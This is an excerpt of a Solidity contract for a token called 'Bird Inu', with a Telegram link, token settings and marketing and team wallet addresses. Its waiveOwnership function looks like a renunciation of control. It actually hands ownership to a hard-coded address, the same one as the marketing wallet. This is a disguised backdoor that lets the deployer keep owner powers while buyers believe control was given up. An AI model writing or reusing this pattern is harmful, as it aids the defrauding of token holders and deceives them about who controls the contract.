...
// *Telegram : https://t.me/inubirdbsc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xb53B8025AEe242DF13D18dAdFEA87ef3Af618a27));
        _owner = address(0xb53B8025AEe242DF13D18dAdFEA87ef3Af618a27);
    }
...
contract BirdInu is Context, IERC20, Ownable {
    ...
    string private _name = "Bird Inu";
    string private _symbol = "BIRDINU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb53B8025AEe242DF13D18dAdFEA87ef3Af618a27);
    address payable public teamWalletAddress = payable(0x7F15C11e56eA60Ede73b215BE5c79fFd211fD8E5);
